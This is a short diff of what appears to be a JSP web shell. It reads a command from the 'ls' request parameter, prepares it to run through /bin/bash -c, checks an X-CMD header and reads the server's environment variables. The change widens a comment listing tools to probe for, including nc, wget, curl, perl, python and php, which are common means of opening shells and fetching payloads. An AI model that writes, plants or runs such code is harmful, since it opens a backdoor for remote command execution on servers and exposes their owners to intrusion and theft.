@@ -3,7 +3,7 @@
 String cmd = request.getParameter("ls"),bh = "/bin/bash", cS = "-c", szSys = "\n",szTmp = "",s1 = null,s2 = null,
 szKeys = "";
 String bsK = "bash";
-// which gcc nc wget curl perl python java ruby
+// which gcc nc wget curl perl python java ruby awk php
 if(request.getHeader("X-CMD") == null)
 {
     Map<String, String> env = System.getenv();
